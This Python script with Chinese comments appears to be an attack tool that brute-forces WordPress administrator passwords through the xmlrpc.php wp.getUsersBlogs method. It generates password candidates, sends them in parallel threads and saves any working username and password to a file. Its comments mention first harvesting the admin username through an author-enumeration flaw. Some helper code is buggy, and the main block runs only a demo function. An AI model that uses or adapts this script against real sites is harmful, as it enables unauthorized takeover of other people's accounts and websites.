# codding:utf-8
'''
漏洞详情请查看：http://www.freebuf.com/articles/web/38861.html
'''
import random
import re
from queue import Queue

import requests
import itertools as its
import threadpool
import threading

import time

queue = Queue()
r = re.compile('(\\w)\\1{2,}')

# words = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789~!@#$%^&*()_-+=/*<>:;\'"[]{}|'
words = 'ABCDE'

def ReadMe():
    print ("""说明：
    1.在本文件同目录下新建usernames.txt、passwords.txt分别存入用户名、密码字典
    2.按提示输入WordPress站点(例如:www.freebuf.com)
    """)

def gen_pwd(pwd_len):
    return its.product(words, repeat=pwd_len)
    # return its.permutations(words, pwd_len)
# "https://gzxy.me/xmlrpc.php"

def exec_req(key, requrl = "http://www.baidu.com", name = 'admin'):
    # time.sleep(2)
    key = ''.join(key)
    reqdata = '<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs\
                           </methodName><params><param><value>' + name + \
              '</value></param><param><value>' + ''.join(key) + \
              '</value></param></params></methodCall>'
    req = requests.post(url=requrl, data=reqdata)
    result = req.text
    # print(req.text)
    if "isAdmin" in result:
        print("Got it !")

        with open("result", 'a') as f:
            f.write("username :" + name + "password :" + key)

        print("username :" + name + "password :" + key)
    elif "faultString" and "403" in result:

        with open("uncorrect_result", 'a') as f:
            f.write(("{0} is not correct.\r\n".format(key)))

        print ("{0} is not correct.".format(key))
    else:
        print("Unknown error")




def Exploit():

    if True:
    #usernames.txt 文件中其实只有一个用户名，因为我们通过author漏洞获取到了管理的用户名。
        # f_username=open("usernames.txt","r")
        count = 10
        for n in range(8, 16):
            # for p in gen_pwd(n):
            #     exec_req(p)
            it = gen_pwd(n)
            flag = False
            pool = threadpool.ThreadPool(count+5)
            while True:
                for i in range(0, count):
                    try:
                        t = ''.join(next(it))
                        queue.put(t)
                    except StopIteration:
                        flag = True
                        pass
                l_pwd = []
                if queue.empty() and flag:
                    break

                while not queue.empty():
                    l_pwd.append(queue.get())

                if len(l_pwd) > 0:
                    print(l_pwd)
                    requests = threadpool.makeRequests(exec_req, l_pwd)
                    [pool.putRequest(req) for req in requests]
                    pool.wait()
        print("抱歉，在此字典中并未找到正确的密码")

def say(s, num):
    pass

def check_item(x):
    return r.match(''.join(x))


def permutations(n):
    indices = list(range(n))
    print(indices)
    while True:
        low_index = n-1
        while low_index > 0 and indices[low_index-1] > indices[low_index]:
            low_index -= 1
        if low_index == 0:
            break
        low_index -= 1
        high_index = low_index+1
        while high_index < n and indices[high_index] > indices[low_index]:
            high_index += 1
        high_index -= 1
        indices[low_index], indices[high_index] = indices[
            high_index], indices[low_index]
        indices[low_index+1:] = reversed(indices[low_index+1:])
        print(indices)



def decar (n):
    l_rec = [0 for i in range(n)]
    str_size = len(words)
    for i in range(0, len(l_rec)):

        while l_rec[i] < str_size:
            for j in range(0,len(l_rec)):
                print(words[j], end="")
            print("")
            l_rec[i] += 1

if __name__ == '__main__' :
    # ReadMe()
    # Exploit()

    # for i in gen_pwd(3):
    #     print(i)
    decar(4)

    # c = [[a, b, d,e,f,g,h] for a in words for b in words for c in words for d in words for e in words for f in words for g in words for h in words]
    # print (c)
    # pool = threadpool.ThreadPool(30)
    # requests = threadpool.makeRequests(say, range(0,1000000))
    # [pool.putRequest(req) for req in requests]
    # pool.wait()

    # words = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!@#$%^&*()_-+=/*<>:;\'"[]{}|'
    # r = its.product(words, repeat=8)
    # print()
    # for i in r:
    #     print(''.join(i))



